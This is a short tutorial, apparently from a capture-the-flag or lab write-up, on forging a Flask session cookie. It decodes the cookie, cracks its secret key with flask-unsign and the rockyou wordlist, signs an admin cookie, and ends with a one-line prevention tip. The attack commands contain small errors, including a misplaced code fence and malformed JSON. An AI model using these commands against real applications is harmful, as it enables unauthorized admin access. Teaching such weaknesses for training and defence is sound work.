In the header of the request, check the cookie session :

```
Cookie: session=eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9.aj6UdQ.hueA7cTSKSXUff1OXnzOO7NwB3U
```

You can see 3 strings separated by a dot :
- ```eyJhZG1pbiI6ImZhbHNlIiwidXNlcm5hbWUiOiJndWVzdCJ9``` the id
- ```aj6UdQ``` the timestamp (creation date)
- ```hueA7cTSKSXUff1OXnzOO7NwB3U``` the signature

Here, the id is an encoded JSON text :

```
{"admin":"false", "username":"guest"}
```

You can know try to find the signature using ```flask-unsign``` :

```shell
flask-unsign -u -c "$(COOKIE SESSION)" -w "/usr/tmp/wordlists/rockyou.txt" ```
--no-literal-eval
```

Know you have the secret key, you can create a new cookie session :

```shell
flask-unsign -s -c '{"admin":"true". "username":"guest"}' --secret "$(SECRET KEY)"
```

And use the output in the request to access as an admin.

### Prevention

To prevent this attack, use a strong secret key that cannot be cracked with any wordlist.